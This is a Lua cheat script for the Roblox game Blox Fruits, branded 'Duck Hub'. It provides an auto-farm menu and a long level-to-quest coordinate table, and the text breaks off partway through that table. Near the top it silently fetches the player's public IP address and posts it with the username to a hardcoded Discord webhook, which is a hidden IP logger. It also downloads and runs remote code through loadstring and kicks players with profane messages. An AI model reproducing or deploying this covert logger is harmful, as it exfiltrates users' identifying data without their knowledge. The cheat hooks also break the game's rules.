repeat
    wait()
until game:IsLoaded()
if game.PlaceId == 2753915549 then
    World1 = true
elseif game.PlaceId == 4442272183 then
    World2 = true
elseif game.PlaceId == 7449423635 then
    World3 = true
end
game.StarterGui:SetCore(
    "SendNotification",
    {
        Title = "Duck hub",
        Icon = "rbxthumb://type=GamePass&id=944258394&w=150&h=150",
        Text = "Đang Tải",
        Duration = 5
    })

function PostWebhook(Url, message)
    local request = http_request or request or HttpPost or syn.request
    local data =
        request(
        {
            Url = Url,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = game:GetService("HttpService"):JSONEncode(message)
        }
    )
    return ""
end

function AdminLoggerMsg()
    local randomColor = math.random(0, 0xFFFFFF)
    local AdminMessage = {
        ["embeds"] = {
            {
                ["title"] = "**Duck Hub**",
                ["description"] = "",
                ["type"] = "rich",
                ["color"] = randomColor, 
                ["fields"] = {
                    {
                        ["name"] = "**Username**",
                        ["value"] = "```" .. game.Players.LocalPlayer.Name .. "```",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "**IP Address**",
                        ["value"] = "```" .. tostring(game:HttpGet("https://api.ipify.org", true)) .. "```",
                        ["inline"] = false
                    },
                },
                ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%S")
            }
        }
    }
    return AdminMessage
end

PostWebhook("https://discord.com/api/webhooks/1287076111498608661/YdTeQM8NT1DRLXcEwAnhU33MZJ2sE3uG9IC3O0zTVXUI8iwKcpi9DPs2gDKYxq36Q3W8", AdminLoggerMsg()) -- Post to admin webhook
if game.PlaceId == 2753915549 then
        World1 = true
    elseif game.PlaceId == 4442272183 then
        World2 = true
    elseif game.PlaceId == 7449423635 then
        World3 = true
    end

require(game.ReplicatedStorage.Util.CameraShaker):Stop()

local bannedHWID = ""

-- Hàm kiểm tra HWID và kick nếu bị cấm
local function checkAndKickPlayer()
    local player = game:GetService("Players").LocalPlayer
    local playerHWID = player.UserId

    if playerHWID == bannedHWID then
        player:Kick("Ngu")
    end
end

checkAndKickPlayer()

if not game:IsLoaded() then game.Loaded:Wait() end
local fask = task 

local Fluent = loadstring(game:HttpGet("https://github.com/dawid-scripts/Fluent/releases/latest/download/main.lua"))()

local Window = Fluent:CreateWindow({
    Title = "Duck Hub",
    SubTitle = "By UwU ( Duck hub ) - khoanguyen0306#0",
    TabWidth = 110,
    Size = UDim2.fromOffset(480, 320),
    Acrylic = false,
    Theme = "Yellow",
    MinimizeKey = Enum.KeyCode.End
})

local Tabs = {
    infor = Window:AddTab({ Title = "Home", Icon = "" }),
    Main = Window:AddTab({ Title = "Auto Farm", Icon = "" }),
    Home = Window:AddTab({ Title = "Status server", Icon = "" }),
    St = Window:AddTab({ Title = "Status player", Icon = "" }),
    item = Window:AddTab({ Title = "Auto Item", Icon = "" }),
    cailon = Window:AddTab({ Title = "Kitsune", Icon = "" }),
    Tele = Window:AddTab({ Title = "Tele", Icon = "" }),
    Se = Window:AddTab({ Title = "Sea Event", Icon = "" }),
    Race = Window:AddTab({ Title = "Trial Tộc V4", Icon = "" }),
    Raid = Window:AddTab({ Title = "Raid Fruit", Icon = "" }),
    Melee = Window:AddTab({ Title = "Shop", Icon = "" })
}

local Options = Fluent.Options

--//ScreenGui
local ScreenGui = Instance.new("ScreenGui")
local ImageButton = Instance.new("ImageButton")
local UICorner = Instance.new("UICorner")

ScreenGui.Parent = game.CoreGui
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

ImageButton.Parent = ScreenGui
ImageButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
ImageButton.BorderSizePixel = 0
ImageButton.Position = UDim2.new(0.120833337, 0, 0.0952890813, 0)
ImageButton.Size = UDim2.new(0, 50, 0, 50)
ImageButton.Draggable = true
ImageButton.Image = "rbxthumb://type=GamePass&id=944258394&w=150&h=150"

UICorner.CornerRadius = UDim.new(0, 10) 
UICorner.Parent = ImageButton

ImageButton.MouseButton1Down:Connect(function()
    game:GetService("VirtualInputManager"):SendKeyEvent(true, Enum.KeyCode.End, false, game)
end)

local function playSound()
    local sound = Instance.new("Sound", game:GetService("CoreGui"))
    sound.SoundId = "rbxassetid://130785805"
    sound.Volume = 10
    sound:Play()
end

playSound()

repeat wait() until game.Players
repeat wait() until game.Players.LocalPlayer
repeat wait() until game.ReplicatedStorage
repeat wait() until game.ReplicatedStorage:FindFirstChild("Remotes");
repeat wait() until game.Players.LocalPlayer:FindFirstChild("PlayerGui");
repeat wait() until game.Players.LocalPlayer.PlayerGui:FindFirstChild("Main");
repeat wait() until game:GetService("Players")
repeat wait() until game:GetService("Players").LocalPlayer.Character:FindFirstChild("Energy")
wait(0.5)
if not game:IsLoaded() then repeat game.Loaded:Wait() until game:IsLoaded() end
if game.PlaceId == 2753915549 then
        World1 = true
    elseif game.PlaceId == 4442272183 then
        World2 = true
    elseif game.PlaceId == 7449423635 then
        World3 = true
    else
    game:GetService("Players").LocalPlayer:Kick(" Con Đĩ Mẹ Mày")
  end
      
         hookfunction(require(game:GetService("ReplicatedStorage").Effect.Container.Death), function()end)
        hookfunction(require(game:GetService("ReplicatedStorage").Effect.Container.Respawn), function()end)
        
	function CheckQuest() 
        MyLevel = game:GetService("Players").LocalPlayer.Data.Level.Value
        if World1 then
            if MyLevel == 1 or MyLevel <= 9 then
                Mon = "Bandit"
                LevelQuest = 1
                NameQuest = "BanditQuest1"
                NameMon = "Bandit"
                CFrameQuest = CFrame.new(1059.37195, 15.4495068, 1550.4231, 0.939700544, -0, -0.341998369, 0, 1, -0, 0.341998369, 0, 0.939700544)
                CFrameMon = CFrame.new(1045.962646484375, 27.00250816345215, 1560.8203125)
                
            elseif MyLevel == 10 or MyLevel <= 14 then
                Mon = "Monkey"
                LevelQuest = 1
                NameQuest = "JungleQuest"
                NameMon = "Monkey"
                CFrameQuest = CFrame.new(-1598.08911, 35.5501175, 153.377838, 0, 0, 1, 0, 1, -0, -1, 0, 0)
                CFrameMon = CFrame.new(-1243.63867, 11.8520432, 160.512344)
                
            elseif MyLevel == 15 or MyLevel <= 29 then
                Mon = "Gorilla"
                LevelQuest = 2
                NameQuest = "JungleQuest"
                NameMon = "Gorilla"
                CFrameQuest = CFrame.new(-1598.08911, 35.5501175, 153.377838, 0, 0, 1, 0, 1, -0, -1, 0, 0)
                CFrameMon = CFrame.new(-1231.79907, 6.27936316, -509.254761)
                
            elseif MyLevel == 30 or MyLevel <= 39 then        
                Mon = "Pirate"
                LevelQuest = 1
                NameQuest = "BuggyQuest1"
                NameMon = "Pirate"
                CFrameQuest = CFrame.new(-1141.07483, 4.10001802, 3831.5498, 0.965929627, -0, -0.258804798, 0, 1, -0, 0.258804798, 0, 0.965929627)
                CFrameMon = CFrame.new(-1215.10522, 4.7520504, 3913.46265)
                
            elseif MyLevel == 40 or MyLevel <= 59 then
                Mon = "Brute"
                LevelQuest = 2
                NameQuest = "BuggyQuest1"
                NameMon = "Brute"
                CFrameQuest = CFrame.new(-1141.07483, 4.10001802, 3831.5498, 0.965929627, -0, -0.258804798, 0, 1, -0, 0.258804798, 0, 0.965929627)
                CFrameMon = CFrame.new(-1005.80945, 14.869874, 4308.99268)
            elseif MyLevel == 60 or MyLevel <= 74 then
                Mon = "Desert Bandit"
                LevelQuest = 1
                NameQuest = "DesertQuest"
                NameMon = "Desert Bandit"
                CFrameQuest = CFrame.new(894.488647, 5.14000702, 4392.43359, 0.819155693, -0, -0.573571265, 0, 1, -0, 0.573571265, 0, 0.819155693)
                CFrameMon = CFrame.new(924.7998046875, 6.44867467880249, 4481.5859375)
            elseif MyLevel == 75 or MyLevel <= 89 then
                Mon = "Desert Officer"
                LevelQuest = 2
                NameQuest = "DesertQuest"
                NameMon = "Desert Officer"
                CFrameQuest = CFrame.new(894.488647, 5.14000702, 4392.43359, 0.819155693, -0, -0.573571265, 0, 1, -0, 0.573571265, 0, 0.819155693)
                CFrameMon = CFrame.new(1608.2822265625, 8.614224433898926, 4371.00732421875)
                
            elseif MyLevel == 90 or MyLevel <= 99 then
                Mon = "Snow Bandit"
                LevelQuest = 1
                NameQuest = "SnowQuest"
                NameMon = "Snow Bandit"
                CFrameQuest = CFrame.new(1389.74451, 88.1519318, -1298.90796, -0.342042685, 0, 0.939684391, 0, 1, 0, -0.939684391, 0, -0.342042685)
                CFrameMon = CFrame.new(1354.347900390625, 87.27277374267578, -1393.946533203125)
                
            elseif MyLevel == 100 or MyLevel <= 119 then
                Mon = "Snowman"
                LevelQuest = 2
                NameQuest = "SnowQuest"
                NameMon = "Snowman"
                CFrameQuest = CFrame.new(1389.74451, 88.1519318, -1298.90796, -0.342042685, 0, 0.939684391, 0, 1, 0, -0.939684391, 0, -0.342042685)
                CFrameMon = CFrame.new(1201.6412353515625, 144.57958984375, -1550.0670166015625)
                
            elseif MyLevel == 120 or MyLevel <= 149 then
                Mon = "Chief Petty Officer"
                LevelQuest = 1
                NameQuest = "MarineQuest2"
                NameMon = "Chief Petty Officer"
                CFrameQuest = CFrame.new(-5039.58643, 27.3500385, 4324.68018, 0, 0, -1, 0, 1, 0, 1, 0, 0)
                CFrameMon = CFrame.new(-4881.23095703125, 22.65204429626465, 4273.75244140625)
                ----
            elseif MyLevel == 150 or MyLevel <= 174 then
                Mon = "Sky Bandit"
                LevelQuest = 1
                NameQuest = "SkyQuest"
                NameMon = "Sky Bandit"
                CFrameQuest = CFrame.new(-4839.53027, 716.368591, -2619.44165, 0.866007268, 0, 0.500031412, 0, 1, 0, -0.500031412, 0, 0.866007268)
                CFrameMon = CFrame.new(-4953.20703125, 295.74420166015625, -2899.22900390625)
                
            elseif MyLevel == 175 or MyLevel <= 189 then
                Mon = "Dark Master"
                LevelQuest = 2
                NameQuest = "SkyQuest"
                NameMon = "Dark Master"
                CFrameQuest = CFrame.new(-4839.53027, 716.368591, -2619.44165, 0.866007268, 0, 0.500031412, 0, 1, 0, -0.500031412, 0, 0.866007268)
                CFrameMon = CFrame.new(-5259.8447265625, 391.3976745605469, -2229.035400390625)
                
            elseif MyLevel == 190 or MyLevel <= 209 then
                Mon = "Prisoner"
                LevelQuest = 1
                NameQuest = "PrisonerQuest"
                NameMon = "Prisoner"
                CFrameQuest = CFrame.new(5308.93115, 1.65517521, 475.120514, -0.0894274712, -5.00292918e-09, -0.995993316, 1.60817859e-09, 1, -5.16744869e-09, 0.995993316, -2.06384709e-09, -0.0894274712)
                CFrameMon = CFrame.new(5098.9736328125, -0.3204058110713959, 474.2373352050781)
                
            elseif MyLevel == 210 or MyLevel <= 249 then
                Mon = "Dangerous Prisoner"
                LevelQuest = 2
                NameQuest = "PrisonerQuest"
                NameMon = "Dangerous Prisoner"
                CFrameQuest = CFrame.new(5308.93115, 1.65517521, 475.120514, -0.0894274712, -5.00292918e-09, -0.995993316, 1.60817859e-09, 1, -5.16744869e-09, 0.995993316, -2.06384709e-09, -0.0894274712)
                CFrameMon = CFrame.new(5654.5634765625, 15.633401870727539, 866.2991943359375)
                
            elseif MyLevel == 250 or MyLevel <= 274 then
                Mon = "Toga Warrior"
                LevelQuest = 1
                NameQuest = "ColosseumQuest"
                NameMon = "Toga Warrior"
                CFrameQuest = CFrame.new(-1580.04663, 6.35000277, -2986.47534, -0.515037298, 0, -0.857167721, 0, 1, 0, 0.857167721, 0, -0.515037298)
                CFrameMon = CFrame.new(-1820.21484375, 51.68385696411133, -2740.6650390625)
            elseif MyLevel == 275 or MyLevel <= 299 then
                Mon = "Gladiator"
                LevelQuest = 2
                NameQuest = "ColosseumQuest"
                NameMon = "Gladiator"
                CFrameQuest = CFrame.new(-1580.04663, 6.35000277, -2986.47534, -0.515037298, 0, -0.857167721, 0, 1, 0, 0.857167721, 0, -0.515037298)
                CFrameMon = CFrame.new(-1292.838134765625, 56.380882263183594, -3339.031494140625)
            elseif MyLevel == 300 or MyLevel <= 324 then
                Mon = "Military Soldier"
                LevelQuest = 1
                NameQuest = "MagmaQuest"
                NameMon = "Military Soldier"
                CFrameQuest = CFrame.new(-5313.37012, 10.9500084, 8515.29395, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469)
                CFrameMon = CFrame.new(-5411.16455078125, 11.081554412841797, 8454.29296875)
            elseif MyLevel == 325 or MyLevel <= 374 then
                Mon = "Military Spy"
                LevelQuest = 2
                NameQuest = "MagmaQuest"
                NameMon = "Military Spy"
                CFrameQuest = CFrame.new(-5313.37012, 10.9500084, 8515.29395, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469)
                CFrameMon = CFrame.new(-5802.8681640625, 86.26241302490234, 8828.859375)
            elseif MyLevel == 375 or MyLevel <= 399 then
                Mon = "Fishman Warrior"
                LevelQuest = 1
                NameQuest = "FishmanQuest"
                NameMon = "Fishman Warrior"
                CFrameQuest = CFrame.new(61122.65234375, 18.497442245483, 1569.3997802734)
                CFrameMon = CFrame.new(60878.30078125, 18.482830047607422, 1543.7574462890625)
                if _G.AutoFarm and (CFrameQuest.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 10000 then
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("requestEntrance",Vector3.new(61163.8515625, 11.6796875, 1819.7841796875))
                end
            elseif MyLevel == 400 or MyLevel <= 449 then
                Mon = "Fishman Commando"
                LevelQuest = 2
                NameQuest = "FishmanQuest"
                NameMon = "Fishman Commando"
                CFrameQuest = CFrame.new(61122.65234375, 18.497442245483, 1569.3997802734)
                CFrameMon = CFrame.new(61922.6328125, 18.482830047607422, 1493.934326171875)
                if _G.AutoFarm and (CFrameQuest.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 10000 then
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("requestEntrance",Vector3.new(61163.8515625, 11.6796875, 1819.7841796875))
                end
            elseif MyLevel == 450 or MyLevel <= 474 then
                Mon = "God's Guard"
                LevelQuest = 1
                NameQuest = "SkyExp1Quest"
                NameMon = "God's Guard"
                CFrameQuest = CFrame.new(-4721.88867, 843.874695, -1949.96643, 0.996191859, -0, -0.0871884301, 0, 1, -0, 0.0871884301, 0, 0.996191859)
                CFrameMon = CFrame.new(-4710.04296875, 845.2769775390625, -1927.3079833984375)
                if _G.AutoFarm and (CFrameQuest.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 10000 then
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("requestEntrance",Vector3.new(-4607.82275, 872.54248, -1667.55688))
                end
            elseif MyLevel == 475 or MyLevel <= 524 then
                Mon = "Shanda"
                LevelQuest = 2
                NameQuest = "SkyExp1Quest"
                NameMon = "Shanda"
                CFrameQuest = CFrame.new(-7859.09814, 5544.19043, -381.476196, -0.422592998, 0, 0.906319618, 0, 1, 0, -0.906319618, 0, -0.422592998)
                CFrameMon = CFrame.new(-7678.48974609375, 5566.40380859375, -497.2156066894531)
                if _G.AutoFarm and (CFrameQuest.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 10000 then
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("requestEntrance",Vector3.new(-7894.6176757813, 5547.1416015625, -380.29119873047))
                end
            elseif MyLevel == 525 or MyLevel <= 549 then
                Mon = "Royal Squad"
                LevelQuest = 1
                NameQuest = "SkyExp2Quest"
                NameMon = "Royal Squad"
                CFrameQuest = CFrame.new(-7906.81592, 5634.6626, -1411.99194, 0, 0, -1, 0, 1, 0, 1, 0, 0)
                CFrameMon = CFrame.new(-7624.25244140625, 5658.13330078125, -1467.354248046875)
            elseif MyLevel == 550 or MyLevel <= 624 then
                Mon = "Royal Soldier"
                LevelQuest = 2
                NameQuest = "SkyExp2Quest"
                NameMon = "Royal Soldier"
                CFrameQuest = CFrame.new(-7906.81592, 5634.6626, -1411.99194, 0, 0, -1, 0, 1, 0, 1, 0, 0)
                CFrameMon = CFrame.new(-7836.75341796875, 5645.6640625, -1790.6236572265625)
            elseif MyLevel == 625 or MyLevel <= 649 then
                Mon = "Galley Pirate"
                LevelQuest = 1
                NameQuest = "FountainQuest"
                NameMon = "Galley Pirate"
                CFrameQuest = CFrame.new(5259.81982, 37.3500175, 4050.0293, 0.087131381, 0, 0.996196866, 0, 1, 0, -0.996196866, 0, 0.087131381)
                CFrameMon = CFrame.new(5551.02197265625, 78.90135192871094, 3930.412841796875)
            elseif MyLevel >= 650 then
                Mon = "Galley Captain"
                LevelQuest = 2
                NameQuest = "FountainQuest"
                NameMon = "Galley Captain"
                CFrameQuest = CFrame.new(5259.81982, 37.3500175, 4050.0293, 0.087131381, 0, 0.996196866, 0, 1, 0, -0.996196866, 0, 0.087131381)
                CFrameMon = CFrame.new(5441.95166015625, 42.50205993652344, 4950.09375)
            end
        elseif World2 then
            if MyLevel == 700 or MyLevel <= 724 then
                Mon = "Raider"
                LevelQuest = 1
                NameQuest = "Area1Quest"
                NameMon = "Raider"
                CFrameQuest = CFrame.new(-429.543518, 71.7699966, 1836.18188, -0.22495985, 0, -0.974368095, 0, 1, 0, 0.974368095, 0, -0.22495985)
                CFrameMon = CFrame.new(-728.3267211914062, 52.779319763183594, 2345.7705078125)
            elseif MyLevel == 725 or MyLevel <= 774 then
                Mon = "Mercenary"
                LevelQuest = 2
                NameQuest = "Area1Quest"
                NameMon = "Mercenary"
                CFrameQuest = CFrame.new(-429.543518, 71.7699966, 1836.18188, -0.22495985, 0, -0.974368095, 0, 1, 0, 0.974368095, 0, -0.22495985)
                CFrameMon = CFrame.new(-1004.3244018554688, 80.15886688232422, 1424.619384765625)
            elseif MyLevel == 775 or MyLevel <= 799 then
                Mon = "Swan Pirate"
                LevelQuest = 1
                NameQuest = "Area2Quest"
                NameMon = "Swan Pirate"
                CFrameQuest = CFrame.new(638.43811, 71.769989, 918.282898, 0.139203906, 0, 0.99026376, 0, 1, 0, -0.99026376, 0, 0.139203906)
                CFrameMon = CFrame.new(1068.664306640625, 137.61428833007812, 1322.1060791015625)
            elseif MyLevel == 800 or MyLevel <= 874 then
                Mon = "Factory Staff"
                NameQuest = "Area2Quest"
                LevelQuest = 2
                NameMon = "Factory Staff"
                CFrameQuest = CFrame.new(632.698608, 73.1055908, 918.666321, -0.0319722369, 8.96074881e-10, -0.999488771, 1.36326533e-10, 1, 8.92172336e-10, 0.999488771, -1.07732087e-10, -0.0319722369)
                CFrameMon = CFrame.new(73.07867431640625, 81.86344146728516, -27.470672607421875)
            elseif MyLevel == 875 or MyLevel <= 899 then
                Mon = "Marine Lieutenant"
                LevelQuest = 1
                NameQuest = "MarineQuest3"
                NameMon = "Marine Lieutenant"
                CFrameQuest = CFrame.new(-2440.79639, 71.7140732, -3216.06812, 0.866007268, 0, 0.500031412, 0, 1, 0, -0.500031412, 0, 0.866007268)
                CFrameMon = CFrame.new(-2821.372314453125, 75.89727783203125, -3070.089111328125)
            elseif MyLevel == 900 or MyLevel <= 949 then
                Mon = "Marine Captain"
                LevelQuest = 2
                NameQuest = "MarineQuest3"
                NameMon = "Marine Captain"
                CFrameQuest = CFrame.new(-2440.79639, 71.7140732, -3216.06812, 0.866007268, 0, 0.500031412, 0, 1, 0, -0.500031412, 0, 0.866007268)
                CFrameMon = CFrame.new(-1861.2310791015625, 80.17658233642578, -3254.697509765625)
            elseif MyLevel == 950 or MyLevel <= 974 then
                Mon = "Zombie"
                LevelQuest = 1
                NameQuest = "ZombieQuest"
                NameMon = "Zombie"
                CFrameQuest = CFrame.new(-5497.06152, 47.5923004, -795.237061, -0.29242146, 0, -0.95628953, 0, 1, 0, 0.95628953, 0, -0.29242146)
                CFrameMon = CFrame.new(-5657.77685546875, 78.96973419189453, -928.68701171875)
            elseif MyLevel == 975 or MyLevel <= 999 then
                Mon = "Vampire"
                LevelQuest = 2
                NameQuest = "ZombieQuest"
                NameMon = "Vampire"
                CFrameQuest = CFrame.new(-5497.06152, 47.5923004, -795.237061, -0.29242146, 0, -0.95628953, 0, 1, 0, 0.95628953, 0, -0.29242146)
                CFrameMon = CFrame.new(-6037.66796875, 32.18463897705078, -1340.6597900390625)
            elseif MyLevel == 1000 or MyLevel <= 1049 then
                Mon = "Snow Trooper"
                LevelQuest = 1
                NameQuest = "SnowMountainQuest"
                NameMon = "Snow Trooper"
                CFrameQuest = CFrame.new(609.858826, 400.119904, -5372.25928, -0.374604106, 0, 0.92718488, 0, 1, 0, -0.92718488, 0, -0.374604106)
                CFrameMon = CFrame.new(549.1473388671875, 427.3870544433594, -5563.69873046875)
            elseif MyLevel == 1050 or MyLevel <= 1099 then
                Mon = "Winter Warrior"
                LevelQuest = 2
                NameQuest = "SnowMountainQuest"
                NameMon = "Winter Warrior"
                CFrameQuest = CFrame.new(609.858826, 400.119904, -5372.25928, -0.374604106, 0, 0.92718488, 0, 1, 0, -0.92718488, 0, -0.374604106)
                CFrameMon = CFrame.new(1142.7451171875, 475.6398010253906, -5199.41650390625)
            elseif MyLevel == 1100 or MyLevel <= 1124 then
                Mon = "Lab Subordinate"
                LevelQuest = 1
                NameQuest = "IceSideQuest"
                NameMon = "Lab Subordinate"
                CFrameQuest = CFrame.new(-6064.06885, 15.2422857, -4902.97852, 0.453972578, -0, -0.891015649, 0, 1, -0, 0.891015649, 0, 0.453972578)
                CFrameMon = CFrame.new(-5707.4716796875, 15.951709747314453, -4513.39208984375)
            elseif MyLevel == 1125 or MyLevel <= 1174 then
                Mon = "Horned Warrior"
                LevelQuest = 2
                NameQuest = "IceSideQuest"
                NameMon = "Horned Warrior"
                CFrameQuest = CFrame.new(-6064.06885, 15.2422857, -4902.97852, 0.453972578, -0, -0.891015649, 0, 1, -0, 0.891015649, 0, 0.453972578)
                CFrameMon = CFrame.new(-6341.36669921875, 15.951770782470703, -5723.162109375)
            elseif MyLevel == 1175 or MyLevel <= 1199 then
                Mon = "Magma Ninja"
                LevelQuest = 1
                NameQuest = "FireSideQuest"
                NameMon = "Magma Ninja"
                CFrameQuest = CFrame.new(-5428.03174, 15.0622921, -5299.43457, -0.882952213, 0, 0.469463557, 0, 1, 0, -0.469463557, 0, -0.882952213)
                CFrameMon = CFrame.new(-5449.6728515625, 76.65874481201172, -5808.20068359375)
            elseif MyLevel == 1200 or MyLevel <= 1249 then
                Mon = "Lava Pirate"
                LevelQuest = 2
                NameQuest = "FireSideQuest"
                NameMon = "Lava Pirate"
                CFrameQuest = CFrame.new(-5428.03174, 15.0622921, -5299.43457, -0.882952213, 0, 0.469463557, 0, 1, 0, -0.469463557, 0, -0.882952213)
                CFrameMon = CFrame.new(-5213.33154296875, 49.73788070678711, -4701.451171875)
            elseif MyLevel == 1250 or MyLevel <= 1274 then
                Mon = "Ship Deckhand"
                LevelQuest = 1
                NameQuest = "ShipQuest1"
                NameMon = "Ship Deckhand"
                CFrameQuest = CFrame.new(1037.80127, 125.092171, 32911.6016)         
                CFrameMon = CFrame.new(1212.0111083984375, 150.79205322265625, 33059.24609375)    
                if _G.AutoFarm and (CFrameQuest.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 10000 then
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("requestEntrance",Vector3.new(923.21252441406, 126.9760055542, 32852.83203125))
                end
            elseif MyLevel == 1275 or MyLevel <= 1299 then
                Mon = "Ship Engineer"
                LevelQuest = 2
                NameQuest = "ShipQuest1"
                NameMon = "Ship Engineer"
                CFrameQuest = CFrame.new(1037.80127, 125.092171, 32911.6016)   
                CFrameMon = CFrame.new(919.4786376953125, 43.54401397705078, 32779.96875)   
                if _G.AutoFarm and (CFrameQuest.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 10000 then
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("requestEntrance",Vector3.new(923.21252441406, 126.9760055542, 32852.83203125))
                end             
            elseif MyLevel == 1300 or MyLevel <= 1324 then
                Mon = "Ship Steward"
                LevelQuest = 1
                NameQuest = "ShipQuest2"
                NameMon = "Ship Steward"
                CFrameQuest = CFrame.new(968.80957, 125.092171, 33244.125)         
                CFrameMon = CFrame.new(919.4385375976562, 129.55599975585938, 33436.03515625)      
                if _G.AutoFarm and (CFrameQuest.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 10000 then
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("requestEntrance",Vector3.new(923.21252441406, 126.9760055542, 32852.83203125))
                end
            elseif MyLevel == 1325 or MyLevel <= 1349 then
                Mon = "Ship Officer"
                LevelQuest = 2
                NameQuest = "ShipQuest2"
                NameMon = "Ship Officer"
                CFrameQuest = CFrame.new(968.80957, 125.092171, 33244.125)
                CFrameMon = CFrame.new(1036.0179443359375, 181.4390411376953, 33315.7265625)
                if _G.AutoFarm and (CFrameQuest.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 10000 then
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("requestEntrance",Vector3.new(923.21252441406, 126.9760055542, 32852.83203125))
                end
            elseif MyLevel == 1350 or MyLevel <= 1374 then
                Mon = "Arctic Warrior"
                LevelQuest = 1
                NameQuest = "FrostQuest"
                NameMon = "Arctic Warrior"
                CFrameQuest = CFrame.new(5667.6582, 26.7997818, -6486.08984, -0.933587909, 0, -0.358349502, 0, 1, 0, 0.358349502, 0, -0.933587909)
                CFrameMon = CFrame.new(5966.24609375, 62.97002029418945, -6179.3828125)
                if _G.AutoFarm and (CFrameQuest.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 10000 then
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("requestEntrance",Vector3.new(-6508.5581054688, 5000.034996032715, -132.83953857422))
                end
            elseif MyLevel == 1375 or MyLevel <= 1424 then
                Mon = "Snow Lurker"
                LevelQuest = 2
                NameQuest = "FrostQuest"
                NameMon = "Snow Lurker"
                CFrameQuest = CFrame.new(5667.6582, 26.7997818, -6486.08984, -0.933587909, 0, -0.358349502, 0, 1, 0, 0.358349502, 0, -0.933587909)
                CFrameMon = CFrame.new(5407.07373046875, 69.19437408447266, -6880.88037109375)
            elseif MyLevel == 1425 or MyLevel <= 1449 then
                Mon = "Sea Soldier"
                LevelQuest = 1
                NameQuest = "ForgottenQuest"
                NameMon = "Sea Soldier"
                CFrameQuest = CFrame.new(-3054.44458, 235.544281, -10142.8193, 0.990270376, -0, -0.13915664, 0, 1, -0, 0.13915664, 0, 0.990270376)
                CFrameMon = CFrame.new(-3028.2236328125, 64.67451477050781, -9775.4267578125)
            elseif MyLevel >= 1450 then
                Mon = "Water Fighter"
                LevelQuest = 2
                NameQuest = "ForgottenQuest"
                NameMon = "Water Fighter"
                CFrameQuest = CFrame.new(-3054.44458, 235.544281, -10142.8193, 0.990270376, -0, -0.13915664, 0, 1, -0, 0.13915664, 0, 0.990270376)
                CFrameMon = CFrame.new(-3352.9013671875, 285.01556396484375, -10534.841796875)
            end
        elseif World3 then
            if MyLevel == 1500 or MyLevel <= 1524 then
                Mon = "Pirate Millionaire"
                LevelQuest = 1
                NameQuest = "PiratePortQuest"
                NameMon = "Pirate Millionaire"
                CFrameQuest = CFrame.new(-290.074677, 42.9034653, 5581.58984, 0.965929627, -0, -0.258804798, 0, 1, -0, 0.258804798, 0, 0.965929627)
                CFrameMon = CFrame.new(-245.9963836669922, 47.30615234375, 5584.1005859375)
            elseif MyLevel == 1525 or MyLevel <= 1574 then
                Mon = "Pistol Billionaire"
                LevelQuest = 2
                NameQuest = "PiratePortQuest"
                NameMon = "Pistol Billionaire"
                CFrameQuest = CFrame.new(-290.074677, 42.9034653, 5581.58984, 0.965929627, -0, -0.258804798, 0, 1, -0, 0.258804798, 0, 0.965929627)
                CFrameMon = CFrame.new(-187.3301544189453, 86.23987579345703, 6013.513671875)
            elseif MyLevel == 1575 or MyLevel <= 1599 then
                Mon = "Dragon Crew Warrior"
                LevelQuest = 1
                NameQuest = "AmazonQuest"
                NameMon = "Dragon Crew Warrior"
                CFrameQuest = CFrame.new(5832.83594, 51.6806107, -1101.51563, 0.898790359, -0, -0.438378751, 0, 1, -0, 0.438378751, 0, 0.898790359)
                CFrameMon = CFrame.new(6141.140625, 51.35136413574219, -1340.738525390625)
            elseif MyLevel == 1600 or MyLevel <= 1624 then 
                Mon = "Dragon Crew Archer"
                NameQuest = "AmazonQuest"
                LevelQuest = 2
                NameMon = "Dragon Crew Archer"
                CFrameQuest = CFrame.new(5833.1147460938, 51.60498046875, -1103.0693359375)
                CFrameMon = CFrame.new(6616.41748046875, 441.7670593261719, 446.0469970703125)
            elseif MyLevel == 1625 or MyLevel <= 1649 then
                Mon = "Female Islander"
                NameQuest = "AmazonQuest2"
                LevelQuest = 1
                NameMon = "Female Islander"
                CFrameQuest = CFrame.new(5446.8793945313, 601.62945556641, 749.45672607422)
                CFrameMon = CFrame.new(4685.25830078125, 735.8078002929688, 815.3425903320312)
            elseif MyLevel == 1650 or MyLevel <= 1699 then 
                Mon = "Giant Islander"
                NameQuest = "AmazonQuest2"
                LevelQuest = 2
                NameMon = "Giant Islander"
                CFrameQuest = CFrame.new(5446.8793945313, 601.62945556641, 749.45672607422)
                CFrameMon = CFrame.new(4729.09423828125, 590.436767578125, -36.97627639770508)
            elseif MyLevel == 1700 or MyLevel <= 1724 then
                Mon = "Marine Commodore"
                LevelQuest = 1
                NameQuest = "MarineTreeIsland"
                NameMon = "Marine Commodore"
                CFrameQuest = CFrame.new(2180.54126, 27.8156815, -6741.5498, -0.965929747, 0, 0.258804798, 0, 1, 0, -0.258804798, 0, -0.965929747)
                CFrameMon = CFrame.new(2286.0078125, 73.13391876220703, -7159.80908203125)
            elseif MyLevel == 1725 or MyLevel <= 1774 then
                Mon = "Marine Rear Admiral"
